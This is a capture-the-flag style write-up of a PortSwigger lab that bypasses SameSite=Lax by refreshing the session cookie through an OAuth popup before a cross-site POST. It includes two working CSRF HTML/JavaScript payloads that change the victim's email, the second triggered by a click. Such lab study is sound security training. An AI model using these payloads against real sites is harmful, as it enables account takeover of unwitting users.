# CSRF - SameSite Lax bypass via cookie refresh

## 📌 Lab Details
- **Title**: SameSite Lax bypass via cookie refresh
- **Difficulty**: Practitioner
- **Category**: Cross-site Request Forgery
- **Lab URL**: https://portswigger.net/academy/labs/launch/45d14a50b45f44eb45dfc4a06b898d985a5bace7f1c3f943697338608838388e?referrer=%2fweb-security%2fcsrf%2fbypassing-samesite-restrictions%2flab-samesite-strict-bypass-via-cookie-refresh

## 🔍 Summary
This lab shows how **SameSite=Lax can be bypassed using an OAuth login flow to refresh the session cookie** just before performing a **CSRF attack**. Since SameSite=Lax allows cookies on **top-level GET navigations**, using a **social login popup immediately before a cross-site POST** allows the fresh session cookie to be included in the CSRF request, changing the victim’s email.

## 🛠 Steps to Solve
1. Log in to the given account.
2. Study the **POST change-email** request to observe that no **CSRF** tokens are being used.
3. Study the **GET /oauth-callback?code=[...]** request to observe that no `SameSite` restriction is used which means that the site will use default `SameSite=Lax` restriciton.
4. Attempt a basic CSRF attack:
   ```sh
   <script>
    history.pushState('', '', '/')
    </script>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="foo@bar.com" />
    <input type="submit" value="Submit request" />
    </form>
    <script>
    document.forms[0].submit();
    </script>
    ```
5. Store and view the exploit yourself. If it has been longer than two minutes, you will be logged in via **OAuth** flow. In this case repeat the step immediately.
6. If you logged in less than two minutes ago, the attack is successful and your email id is changed.
7. Crafting the final **CSRF** attack and bypassing **popup blocker**:
   ```sh
   <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
    </form>
    <p>Click anywhere on the page</p>
    <script>
    window.onclick = () => {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
    </script>
    ```
8. Deliver the exploit to the victim and solve the lab.
   
## 📖 Key Takeaways
- **SameSite=Lax** allows cookies on top-level navigations (`GET`) but blocks them on cross-site `POST` unless the cookie is fresh.
- By forcing the victim to **click (user interaction)**, triggering a social login OAuth popup, you refresh the session cookie in the victim’s browser.
- Immediately after, you send a **cross-site POST CSRF request**, which now includes the refreshed cookie, allowing the CSRF to succeed.
- **Timing + OAuth popup + user click = bypass SameSite=Lax for CSRF**.

## 🖼️ Screenshot 
![image](https://github.com/user-attachments/assets/724728f9-04d9-45e4-9494-f2052ed8f4e6)
![image](https://github.com/user-attachments/assets/788b2c0d-45f6-4e44-be6b-73c74e52f61e)
![image](https://github.com/user-attachments/assets/357e0f9f-ed63-4569-afe3-6824ce1043ee)
![image](https://github.com/user-attachments/assets/09c75f4d-f3f4-4f8e-a0dd-1271acd84ee2)
![image](https://github.com/user-attachments/assets/ce4fce7f-4281-4a65-b5a1-55476223d708)
![image](https://github.com/user-attachments/assets/d8462655-56b1-4914-b326-b0d70e9a6e06)
![image](https://github.com/user-attachments/assets/854b453f-fcce-492a-80e2-641961bc2018)
![image](https://github.com/user-attachments/assets/86ea314a-4693-40b2-b781-40f1abb10579)
![image](https://github.com/user-attachments/assets/a6eaf598-adc3-45e9-aead-bb2f72af0210)
